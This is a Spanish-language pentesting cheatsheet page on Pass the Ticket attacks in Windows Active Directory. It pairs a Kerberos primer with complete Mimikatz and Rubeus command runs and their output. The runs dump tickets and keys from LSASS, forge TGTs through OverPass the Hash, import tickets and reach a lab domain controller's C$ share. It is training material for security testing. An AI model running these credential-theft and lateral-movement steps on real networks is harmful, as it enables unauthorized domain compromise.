
# Pass the Ticket (PtT) - Windows

Otro método para moverse lateralmente en un entorno de Active Directory se denomina [ataque Pass the Ticket (PtT)](https://attack.mitre.org/techniques/T1550/003/) . En este ataque, utilizamos un ticket Kerberos robado para movernos lateralmente en lugar de un hash de contraseña NTLM. Cubriremos varias formas de realizar un ataque PtT desde Windows y Linux. En esta sección, nos centraremos en los ataques de Windows y, en la siguiente sección, cubriremos los ataques de Linux.

***

## Actualización del protocolo Kerberos

El sistema de autenticación Kerberos se basa en tickets. La idea central detrás de Kerberos no es dar una contraseña de cuenta a cada servicio que utilice. En cambio, Kerberos mantiene todos los tickets en su sistema local y presenta a cada servicio solo el ticket específico para ese servicio, evitando que un ticket se utilice para otro propósito.

* El `TGT - Ticket Granting Ticket` es el primer ticket obtenido en un sistema Kerberos. El TGT permite al cliente obtener tickets Kerberos adicionales o `TGS`.
* El `TGS - Ticket Granting Service` Es requerido por los usuarios que quieren utilizar un servicio. Estos tickets permiten que los servicios verifiquen la identidad del usuario.

Cuando un usuario solicita un correo electrónico `TGT`, debe autenticarse en el controlador de dominio cifrando la marca de tiempo actual con su hash de contraseña. Una vez que el controlador de dominio valida la identidad del usuario (porque el dominio conoce el hash de la contraseña del usuario, lo que significa que puede descifrar la marca de tiempo), envía al usuario un TGT para futuras solicitudes. Una vez que el usuario tiene su ticket no necesita acreditar quién es con su contraseña.

Si el usuario desea conectarse a una base de datos MSSQL, solicitará un Ticket Granting Service (`TGS`) al The Key Distribution Center (`KDC`), presentando su Ticket Granting Ticket (`TGT`). Luego entregará el TGS al servidor de base de datos MSSQL para su autenticación.

Se recomienda echar un vistazo a la sección [Kerberos](/ethical-hacking-cheatsheet/active-directory/active-directory/kerberos.md) para obtener una descripción general de alto nivel de cómo funciona este protocolo.

***

## <mark style="color:purple;">Pass the Ticket (PtT)</mark>

Necesitamos un ticket Kerberos válido para realizar un ataque `Pass the Ticket (PtT)`. Puede ser:

* `Ticket de Servicio` (TGS - Ticket Granting Service) para permitir el acceso a un recurso en particular.
* `Ticket Granting Ticket` (TGT), que utilizamos para solicitar tickets de servicio para acceder a cualquier recurso con privilegios para el usuario.

Antes de realizar un ataque `Pass the Ticket (PtT)`, veamos algunos métodos para obtener un ticket usando `Mimikatz` y `Rubeus`.

***

## <mark style="color:purple;">Escenario</mark>

Imaginemos que estamos en un pentest y logramos hacer phishing a un usuario y obtener acceso a su computadora. Encontramos una manera de obtener privilegios administrativos en esta computadora y estamos trabajando con derechos de administrador local. Exploremos varias formas en las que podemos conseguir tickets de acceso en esta computadora y cómo podemos crear tickets nuevos.

***

## <mark style="color:purple;">Dump de tickets Kerberos desde Windows</mark>

En Windows, los tickets se procesan y almacenan mediante el proceso LSASS (Local Security Authority Subsystem Service). Por lo tanto, para obtener un ticket desde un sistema Windows, debes comunicarte con LSASS y solicitarlo. Como usuario no administrativo, sólo podrás conseguir tus tickets, pero como administrador local, podrás recogerlo todo.

Podemos recolectar todos los tickets de un sistema usando el módulo de Mimikatz `sekurlsa::tickets /export`. El resultado es una lista de archivos con la extensión `.kirbi`, que contienen los tickets.

### **Mimikatz - Exportar Tickets**

```powershell
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 329278 (00000000:0005063e)
Session           : Network from 0
User Name         : DC01$
Domain            : HTB
Logon Server      : (null)
Logon Time        : 7/12/2022 9:39:55 AM
SID               : S-1-5-18

         * Username : DC01$
         * Domain   : inlanefreight.htb
         * Password : (null)
         
        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
           Target Name  (--) : @ inlanefreight.htb
           Client Name  (01) : DC01$ ; @ inlanefreight.htb
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             31cfa427a01e10f6e09492f2e8ddf7f74c79a5ef6b725569e19d614a35a69c07
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !

        Group 2 - Ticket Granting Ticket

<SNIP>

mimikatz # exit
Bye!
c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi

<SNIP>

```

Los tickets que terminan en `$`corresponden a la cuenta de la computadora, la cual necesita un ticket para interactuar con Active Directory. Los tickets de usuario tienen el nombre del usuario, seguido de un signo `@`que separa el nombre del servicio y el dominio, por ejemplo: `[randomvalue]-username@service-domain.local.kirbi`.

{% hint style="info" %}
**Nota**: Si recoges un ticket con el servicio krbtgt, corresponde al TGT de esa cuenta.
{% endhint %}

También podemos hacer un dump de tickets usando `Rubeus` y la opción `dump`. Esta opción se puede utilizar para volcar todos los tickets (si se ejecuta como administrador local). `Rubeus dump`, en lugar de darnos un archivo, imprimirá el ticket codificado en formato base64. Estamos agregando la opción `/nowrap` para copiar y pegar más fácilmente.

{% hint style="info" %}
**Nota**: Al momento de escribir este artículo, usando Mimikatz versión 2.2.0 20220919, si ejecutamos "`sekurlsa::ekeys`", presenta todos los hashes como des\_cbc\_md4 en algunas versiones de Windows 10. Los tickets exportados (`sekurlsa::tickets /export`) no funcionan correctamente debido a un cifrado incorrecto. Es posible utilizar estos hashes para generar nuevos tickets o utilizar Rubeus para exportar tickets en formato base64.
{% endhint %}

### **Rubeus - Exportar Tickets**

{% code overflow="wrap" %}

```powershell
c:\tools> Rubeus.exe dump /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x6c680
    ServiceName           :  krbtgt/inlanefreight.htb
    ServiceRealm          :  inlanefreight.htb
    UserName              :  DC01$
    UserRealm             :  inlanefreight.htb
    StartTime             :  7/12/2022 9:39:54 AM
    EndTime               :  7/12/2022 7:39:54 PM
    RenewTill             :  7/19/2022 9:39:54 AM
    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
    Base64EncodedTicket   :

doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2ihO+FY/2Rr0g0iHowOYOgn7EBV3JYEDTNZS2ErKNLVOh0/TczLexQk+bKTMh55oNNQDVzmarvzByKYC0XRTjb1jPuVz4exraxGEBTgJYUunCy/R5agIa6xuuGUvXL+6AbHLvMb+ObdU7Dyn9eXruBscIBX5k3D3S5sNuEnm1sHVsGuDBAN5Ko6kZQRTx22A+lZZD12ymv9rh8S41z0+pfINdXx/VQAxYRL5QKdjbndchgpJro4mdzuEiu8wYOxbpJdzMANSSQiep+wOTUMgimcHCCCrhXdyR7VQoRjjdmTrKbPVGltBOAWQOrFs6YK1OdxBles1GEibRnaoT9qwEmXOa4ICzhjHgph36TQIwoRC+zjPMZl9lf+qtpuOQK86aG7Uwv7eyxwSa1/H0mi5B+un2xKaRmj/mZHXPdT7B5Ruwct93F2zQQ1mKIH0qLZO1Zv/G0IrycXxoE5MxMLERhbPl4Vx1XZGJk2a3m8BmsSZJt/++rw7YE/vmQiW6FZBO/2uzMgPJK9xI8kaJvTOmfJQwVlJslsjY2RAVGly1B0Y80UjeN8iVmKCk3Jvz4QUCLK2zZPWKCn+qMTtvXBqx80VH1hyS8FwU3oh90IqNS1VFbDjZdEQpBGCE/mrbQ2E/rGDKyGvIZfCo7t+kuaCivnY8TTPFszVMKTDSZ2WhFtO2fipId+shPjk3RLI89BT4+TDzGYKU2ipkXm5cEUnNis4znYVjGSIKhtrHltnBO3d1pw402xVJ5lbT+yJpzcEc5N7xBkymYLHAbM9DnDpJ963RN/0FcZDusDdorHA1DxNUCHQgvK17iametKsz6Vgw0zVySsPp/wZ/tssglp5UU6in1Bq91hA2c35l8M1oGkCqiQrfY8x3GNpMPixwBdd2OU1xwn/gaon2fpWEPFzKgDRtKe1FfTjoEySGr38QSs1+JkVk0HTRUbx9Nnq6w3W+D1p+FSCRZyCF/H1ahT9o0IRkFiOj0Cud5wyyEDom08wOmgwxK0D/0aisBTRzmZrSfG7Kjm9/yNmLB5va1yD3IyFiMreZZ2WRpNyK0G6L4H7NBZPcxIgE/Cxx/KduYTPnBDvwb6uUDMcZR83lVAQ5NyHHaHUOjoWsawHraI4uYgmCqXYN7yYmJPKNDI290GMbn1zIPSSL82V3hRbOO8CZNP/f64haRlR63GJBGaOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oCswKaADAgESoSIEIClgTKTOAY3p4054sB9McPBYb2xUn/kgVWSSXFoFCot8oQkbB0hUQi5DT02iEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIyMDcxMjEzMzk1NFqmERgPMjAyMjA3MTIyMzM5NTRapxEYDzIwMjIwNzE5MTMzOTU0WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdIVEIuQ09N

<SNIP>
```

{% endcode %}

{% hint style="info" %}
**Nota**: Para recolectar todos los tickets necesitamos ejecutar Mimikatz o Rubeus como administrador.
{% endhint %}

Esta es una forma común de extraer tickets desde una máquina. Otra ventaja de abusar de los tickets Kerberos es la posibilidad de falsificar nuestros propios tickets. Veamos cómo podemos hacer esto usando la técnica `OverPass the Hash` o `Pass the Key`

***

## <mark style="color:purple;">Pass the Key o OverPass the Hash</mark>

La técnica tradicional `Pass the Hash (PtH)` implica reutilizar un hash de contraseña NTLM que no toca Kerberos. El enfoque `Pass the Key` o `OverPass the Hash` convierte un hash/clave (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) para un usuario unido a un dominio en un archivo `Ticket-Granting-Ticket (TGT)`. Esta técnica fue desarrollada por Benjamin Delpy y Skip Duckwall en su presentación [Abusing Microsoft Kerberos - Sorry you guys don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18). También [Will Schroeder](https://twitter.com/harmj0y) adaptó su proyecto para crear la herramienta [Rubeus](https://github.com/GhostPack/Rubeus) .

Para falsificar nuestros tickets, necesitamos tener el hash del usuario; Podemos usar Mimikatz para volcar las claves de cifrado Kerberos de todos los usuarios usando el módulo `sekurlsa::ekeys`. Este módulo enumerará todos los tipos de claves presentes para el paquete Kerberos.

### **Mimikatz - Extraer claves Kerberos**

```cmd-session
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
<SNIP>

Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : 7/12/2022 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
<SNIP>
```

Ahora que tenemos acceso a las claves `AES256_HMAC`y `RC4_HMAC`, podemos realizar el ataque OverPass the Hash o Pass the Key usando `Mimikatz`y `Rubeus`.

### **Mimikatz: Pass the Key o OverPass the Hash**

```powershell
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

```cmd-session
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

user    : plaintext
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
  |  PID  1128
  |  TID  3268
  |  LSA Process is now R/W
  |  LUID 0 ; 3414364 (00000000:0034195c)
  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
  \_ kerberos - data copy @ 000001C7E20EE578
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001C7E2136BC8 (32) -> null
```

Esto creará una nueva ventana `cmd.exe` que podemos usar para solicitar acceso a cualquier servicio que queramos en el contexto del usuario objetivo.

Para falsificar un ticket usando `Rubeus`, podemos usar el módulo `asktgt` con el nombre de usuario, dominio y hash que puede ser `/rc4`, `/aes128`, `/aes256` o `/des`. En el siguiente ejemplo, utilizamos el hash aes256 de la información que recopilamos mediante Mimikatz `sekurlsa::ekeys`.

### **Rubeus: Pass the Key or OverPass the Hash**

```cmd-session
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/LSsa2xrdJJir1eVugDFCoGFT2hDcYcpRdifXw67WofDM6Z6utsha+4bL0z6QN+tdpPlNQFwjuWmBrZtpS9TcCblotYvDHa0aLVsroW/fqXJ4KIV2tVfbVIDJvPkgdNAbhp6NvlbzeakR1oO5RTm7wtRXeTirfo6C9Ap0HnctlHAd+Qnvo2jGUPP6GHIhdlaM+QShdJtzBEeY/xIrORiiylYcBvOoir8mFEzNpQgYADmbTmg+c7/NgNO8Qj4AjrbGjVf/QWLlGc7sH9+tARi/Gn0cGKDK481A0zz+9C5huC9ZoNJ/18rWfJEb4P2kjlgDI0/fauT5xN+3NlmFVv0FSC8/909pUnovy1KkQaMgXkbFjlxeheoPrP6S/TrEQ8xKMyrz9jqs3ENh//q738lxSo8J2rZmv1QHy+wmUKif4DUwPyb4AHgSgCCUUppIFB3UeKjqB5srqHR78YeAWgY7pgqKpKkEomy922BtNprk2iLV1cM0trZGSk6XJ/H+JuLHI5DkuhkjZQbb1kpMA2CAFkEwdL9zkfrsrdIBpwtaki8pvcBPOzAjXzB7MWvhyAQevHCT9y6iDEEvV7fsF/B5xHXiw3Ur3P0xuCS4K/Nf4GC5PIahivW3jkDWn3g/0nl1K9YYX7cfgXQH9/inPS0OF1doslQfT0VUHTzx8vG3H25vtc2mPrfIwfUzmReLuZH8GCvt4p2BAbHLKx6j/HPa4+YPmV0GyCv9iICucSwdNXK53Q8tPjpjROha4AGjaK50yY8lgknRA4dYl7+O2+j4K/lBWZHy+IPgt3TO7YFoPJIEuHtARqigF5UzG1S+mefTmqpuHmoq72KtidINHqi+GvsvALbmSBQaRUXsJW/Lf17WXNXmjeeQWemTxlysFs1uRw9JlPYsGkXFh3fQ2ngax7JrKiO1/zDNf6cvRpuygQRHMOo5bnWgB2E7hVmXm2BTimE7axWcmopbIkEi165VOy/M+pagrzZDLTiLQOP/X8D6G35+srSr4YBWX4524/Nx7rPFCggxIXEU4zq3Ln1KMT9H7efDh+h0yNSXMVqBSCZLx6h3Fm2vNPRDdDrq7uz5UbgqFoR2tgvEOSpeBG5twl4MSh6VA7LwFi2usqqXzuPgqySjA1nPuvfy0Nd14GrJFWo6eDWoOy2ruhAYtaAtYC6OByDCBxaADAgEAooG9BIG6fYG3MIG0oIGxMIGuMIGroBswGaADAgEXoRIEENEzis1B3YAUCjJPPsZjlduhCRsHSFRCLkNPTaIWMBSgAwIBAaENMAsbCXBsYWludGV4dKMHAwUAQOEAAKURGA8yMDIyMDcxMjE1MjgyNlqmERgPMjAyMjA3MTMwMTI4MjZapxEYDzIwMjIwNzE5MTUyODI2WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdodGIuY29t

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 11:28:26 AM
  EndTime               :  7/12/2022 9:28:26 PM
  RenewTill             :  7/19/2022 11:28:26 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  0TOKzUHdgBQKMk8+xmOV2w==
```

{% hint style="info" %}
**Nota**: Mimikatz requiere derechos administrativos para realizar los ataques Pass the Key/OverPass the Hash, mientras que Rubeus no.
{% endhint %}

Para obtener más información sobre la diferencia entre Mimikatz `sekurlsa::pth`y Rubeus `asktgt`, consulte la documentación de la herramienta Rubeus [Ejemplo para OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash) .

{% hint style="info" %}
**Nota**: Los dominios modernos de Windows (nivel funcional 2008 y superior) utilizan el cifrado AES de forma predeterminada en los intercambios normales de Kerberos. Si utilizamos un hash rc4\_hmac (NTLM) en un intercambio de Kerberos en lugar de una clave aes256\_cts\_hmac\_sha1 (o aes128), se puede detectar como una "degradación de cifrado".
{% endhint %}

***

## <mark style="color:purple;">Pass the Ticket (PtT)</mark>

Ahora que tenemos algunos tickets de Kerberos, podemos usarlos para movernos lateralmente dentro de un entorno.

Realizamos un ataque OverPass the Hash con `Rubeus` y recuperamos el ticket en formato base64. En su lugar, podríamos usar la bandera `/ptt` para enviar el ticket (TGT o TGS) a la sesión de inicio de sesión actual.

### **Rubeus:** Pass the Ticket

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKh
      EzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpcGX6rbUlYxOWeMmu/zb
      f7vGgDj/g+P5zzLbr+XTIPG0kI2WCOlAFCQqz84yQd6IRcEeGjG4YX/9ezJogYNtiLnY6YPkqlQaG1Nn
      pAQBZMIhs01EH62hJR7W5XN57Tm0OLF6OFPWAXncUNaM4/aeoAkLQHZurQlZFDtPrypkwNFQ0pI60NP2
      9H98JGtKKQ9PQWnMXY7Fc/5j1nXAMVj+Q5Uu5mKGTtqHnJcsjh6waE3Vnm77PMilL1OvH3Om1bXKNNan
      JNCgb4E9ms2XhO0XiOFv1h4P0MBEOmMJ9gHnsh4Yh1HyYkU+e0H7oywRqTcsIg1qadE+gIhTcR31M5mX
      5TkMCoPmyEIk2MpO8SwxdGYaye+lTZc55uW1Q8u8qrgHKZoKWk/M1DCvUR4v6dg114UEUhp7WwhbCEtg
      5jvfr4BJmcOhhKIUDxyYsT3k59RUzzx7PRmlpS0zNNxqHj33yAjm79ECEc+5k4bNZBpS2gJeITWfcQOp
      lQ08ZKfZw3R3TWxqca4eP9Xtqlqv9SK5kbbnuuWIPV2/QHi3deB2TFvQp9CSLuvkC+4oNVg3VVR4bQ1P
      fU0+SPvL80fP7ZbmJrMan1NzLqit2t7MPEImxum049nUbFNSH6D57RoPAaGvSHePEwbqIDTghCJMic2X
      c7YJeb7y7yTYofA4WXC2f1MfixEEBIqtk/drhqJAVXz/WY9r/sWWj6dw9eEhmj/tVpPG2o1WBuRFV72K
      Qp3QMwJjPEKVYVK9f+uahPXQJSQ7uvTgfj3N5m48YBDuZEJUJ52vQgEctNrDEUP6wlCU5M0DLAnHrVl4
      Qy0qURQa4nmr1aPlKX8rFd/3axl83HTPqxg/b2CW2YSgEUQUe4SqqQgRlQ0PDImWUB4RHt+cH6D563n4
      PN+yqN20T9YwQMTEIWi7mT3kq8JdCG2qtHp/j2XNuqKyf7FjUs5z4GoIS6mp/3U/kdjVHonq5TqyAWxU
      wzVSa4hlVgbMq5dElbikynyR8maYftQk+AS/xYby0UeQweffDOnCixJ9p7fbPu0Sh2QWbaOYvaeKiG+A
      GhUAUi5WiQMDSf8EG8vgU2gXggt2Slr948fy7vhROp/CQVFLHwl5/kGjRHRdVj4E+Zwwxl/3IQAU0+ag
      GrHDlWUe3G66NrR/Jg8zXhiWEiViMd5qPC2JTW1ronEPHZFevsU0pVK+MDLYc3zKdfn0q0a3ys9DLoYJ
      8zNLBL3xqHY9lNe6YiiAzPG+Q6OByDCBxaADAgEAooG9BIG6fYG3MIG0oIGxMIGuMIGroBswGaADAgEX
      oRIEED0RtMDJnODs5w89WCAI3bChCRsHSFRCLkNPTaIWMBSgAwIBAaENMAsbCXBsYWludGV4dKMHAwUA
      QOEAAKURGA8yMDIyMDcxMjE2Mjc0N1qmERgPMjAyMjA3MTMwMjI3NDdapxEYDzIwMjIwNzE5MTYyNzQ3
      WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdodGIuY29t
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 12:27:47 PM
  EndTime               :  7/12/2022 10:27:47 PM
  RenewTill             :  7/19/2022 12:27:47 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  PRG0wMmc4OznDz1YIAjdsA==
```

Ten en cuenta que ahora se muestra `Ticket successfully imported!`.

Otra forma es importar el ticket a la sesión actual utilizando el archivo `.kirbi` del disco. Usemos un ticket exportado desde Mimikatz e importemoslo usando Pass the Ticket.

### **Rubeus - Pass the Ticket**

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

También podemos usar la salida base64 de Rubeus o convertir un .kirbi a base64 para realizar el ataque Pass the Ticket. Podemos usar PowerShell para convertir un .kirbi a base64.

### **Convertir .kirbi al formato Base64**

```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQzYYQAAAQtMIQAAAQnoIQAAAADAgEFoYQAAAAJGwdIVEIuQ09NooQAAAAsMIQAAAAmoIQAAAADAgECoYQAAAAXMIQAAAARGwZrcmJ0Z3QbB0hUQi5DT02jhAAAA9cwhAAAA9GghAAAAAMCARKhhAAAAAMCAQKihAAAA7kEggO1zqm0SuXewDEmypVORXzj8hyqSmikY9gxbM9xdpmA8r2EvTnv0UYkQFdf4B73Ss5ylutsSsyvnZYRVr8Ta9Wx/fvnjpJw/T70suDA4CgsuSZcBSo/jMnDjucWNtlDc8ez6<SNIP>
```

Usando Rubeus, podemos realizar Pass the Ticket proporcionando la cadena base64 en lugar del nombre del archivo.

### **Pass the Ticket - Formato Base64**

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

Por último, también podemos realizar el ataque Pass the Ticket usando el módulo Mimikatz `kerberos::ptt`y el archivo .kirbi que contiene el ticket que queremos importar.

### **Mimikatz - Pass the Ticket**

```cmd-session
C:\tools> mimikatz.exe 

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
mimikatz # exit
Bye!
c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

{% hint style="info" %}
